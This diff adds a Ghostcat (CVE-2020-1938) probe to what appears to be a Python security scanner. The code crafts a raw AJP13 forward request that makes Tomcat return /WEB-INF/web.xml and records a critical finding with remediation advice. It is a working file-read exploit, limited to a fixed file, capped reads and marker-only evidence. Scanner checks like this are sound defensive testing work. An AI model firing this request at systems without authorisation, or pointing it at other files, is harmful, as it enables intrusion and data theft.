@@ -2289,3 +2289,114 @@ class _ServiceInfraMixin(_ServiceProbeBase):
     except Exception:
       pass
     return findings
+
+  # ── Tomcat AJP13 ────────────────────────────────────────────────
+
+  _AJP_FILE = "/WEB-INF/web.xml"
+  _AJP_MARKER = b"<web-app"
+  _AJP_MAX_READ = 65536
+  _AJP_MAX_PACKETS = 64
+  _AJP_DEADLINE = 10  # seconds for the whole answer
+  # Not "/" and not ending in ".jsp": a welcome file or the JSP servlet could compile web.xml.
+  _AJP_REQ_URI = "/redmesh-ajp"
+
+  @staticmethod
+  def _ajp_string(text):
+    raw = text.encode()
+    return struct.pack(">H", len(raw)) + raw + b"\x00"
+
+  def _ajp_forward_request(self, target, port, file_path):
+    """AJP13 GET whose include attributes make Tomcat serve `file_path` (CVE-2020-1938)."""
+    s = self._ajp_string
+    body = b"\x02\x02" + s("HTTP/1.1") + s(self._AJP_REQ_URI) + s("127.0.0.1") + b"\xff\xff" + s(target)
+    body += struct.pack(">H", port) + b"\x00" + struct.pack(">H", 0)  # not SSL, no headers
+    for name, value in (
+      ("javax.servlet.include.request_uri", "/"),
+      ("javax.servlet.include.path_info", file_path),
+      ("javax.servlet.include.servlet_path", "/"),
+    ):
+      body += b"\x0a" + s(name) + s(value)
+    body += b"\xff"
+    return b"\x12\x34" + struct.pack(">H", len(body)) + body
+
+  def _ajp_read_file(self, sock):
+    """Collect body chunks until END_RESPONSE, the size or packet cap, the deadline or an error.
+
+    Returns the content read so far, also when the read ends early.
+    """
+    data, buf = b"", b""
+    deadline = self._deadline_in(self._AJP_DEADLINE)
+    try:
+      for _ in range(self._AJP_MAX_PACKETS):
+        while len(buf) < 4 or len(buf) < 4 + struct.unpack(">H", buf[2:4])[0]:
+          chunk = self._recv_by(sock, 4096, deadline)
+          if not chunk:
+            return data
+          buf += chunk
+        if buf[:2] != b"AB":
+          return data
+        length = struct.unpack(">H", buf[2:4])[0]
+        packet, buf = buf[4:4 + length], buf[4 + length:]
+        kind = packet[:1]
+        if kind == b"\x03" and len(packet) >= 3:  # SEND_BODY_CHUNK
+          data += packet[3:3 + struct.unpack(">H", packet[1:3])[0]]
+          if len(data) >= self._AJP_MAX_READ:
+            return data
+        elif kind != b"\x04":  # not SEND_HEADERS: END_RESPONSE or anything unexpected ends the read
+          return data
+    except (socket.timeout, OSError):
+      pass
+    return data
+
+  @register_probe(
+    display_name="Tomcat AJP13 file read (Ghostcat)",
+    description=(
+      "Over raw AJP13, read /WEB-INF/web.xml from the web application and "
+      "confirm CVE-2020-1938 when the content matches. Keeps the match marker only."
+    ),
+    category=CATEGORY_SERVICE_INFO,
+    default_cwe=(20,),
+    default_owasp=("A06:2021",),
+    cvss_template="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  )
+  def _service_info_ajp(self, target, port):  # default port: 8009
+    """
+    Ghostcat check. Sends one AJP13 forward request for a fixed file; no credential is used,
+    so the feature holding this probe gates it, not `active_auth`.
+    """
+    raw = {"ajp_file": self._AJP_FILE}
+    sock = None
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(self._target_timeout(3))
+      sock.connect((target, port))
+      sock.sendall(self._ajp_forward_request(target, port, self._AJP_FILE))
+      content = self._ajp_read_file(sock)
+    except Exception as exc:
+      raw["ajp_error"] = str(exc)[:120]
+      return probe_result(raw_data=raw, findings=[])
+    finally:
+      if sock:
+        sock.close()
+
+    findings = []
+    if self._AJP_MARKER in content:
+      marker = self._AJP_MARKER.decode()
+      raw["ajp_marker"] = marker
+      findings.append(Finding(
+        severity=Severity.CRITICAL,
+        cvss_vector=V.UNAUTHENTICATED_FULL_CONTROL,
+        title="Tomcat AJP file read confirmed (Ghostcat, CVE-2020-1938)",
+        cve=("CVE-2020-1938",),
+        **probe_cve_fields("CVE-2020-1938"),
+        description=f"The AJP13 connector on {target}:{port} served {self._AJP_FILE} from the web application "
+                    "to an unauthenticated request. The same flaw allows reading any file under the web root.",
+        evidence=f"AJP13 request for {self._AJP_FILE} returned content containing the marker '{marker}'",
+        remediation="Upgrade Tomcat to 9.0.31, 8.5.51, 7.0.100 or later; set a 'secret' on the AJP connector "
+                    "or disable it; do not expose port 8009.",
+        owasp_id="A06:2021",
+        cwe_id="CWE-20",
+        confidence="certain",
+        confidence_reason="behaviour_confirmed",
+      ))
+    return probe_result(raw_data=raw, findings=findings)
